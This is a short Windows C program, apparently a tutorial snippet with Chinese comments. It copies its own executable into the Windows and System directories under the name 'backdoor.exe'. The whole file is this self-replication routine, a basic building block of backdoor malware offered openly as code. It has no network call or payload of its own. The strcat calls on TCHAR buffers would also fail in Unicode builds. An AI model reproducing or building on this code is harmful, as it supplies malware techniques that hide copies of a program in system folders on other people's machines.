#include <windows.h>
#include <stdio.h>
#include<string.h>

//原型
//DWORD WINAPI GetModuleFileName(
//	HMODULE hModule,
//	LPTSTR lpFileName,
//	DWORD nSize
//);

//hModule：要获取文件名的模块名柄, null表示当前模块
//lpFileName : 输出参数，存放取得的文件名
//	nSize : lpFileName参数的长度

void CopySelf()
{
    // 保存自身程序的路径
    TCHAR szSelfName[MAX_PATH] = { 0 };
    // 保存Windows目录的路径
    TCHAR szWindowsPath[MAX_PATH] = { 0 };
    // 保存系统目录的路径
	TCHAR szSystemPath[MAX_PATH] = { 0 };
    // 临时路径变量
	TCHAR szTmpPath[MAX_PATH] = { 0 };

    GetModuleFileName(NULL, szSelfName, MAX_PATH);
    GetWindowsDirectory(szWindowsPath, MAX_PATH);
    GetSystemDirectory(szSystemPath, MAX_PATH);

    strcat(szWindowsPath, "\\backdoor.exe");
    strcat(szSystemPath, "\\backdoor.exe");

    CopyFile(szSelfName, szWindowsPath, FALSE);
    CopyFile(szSelfName, szSystemPath, FALSE);
}

int main()
{
    CopySelf();

    return 0;
}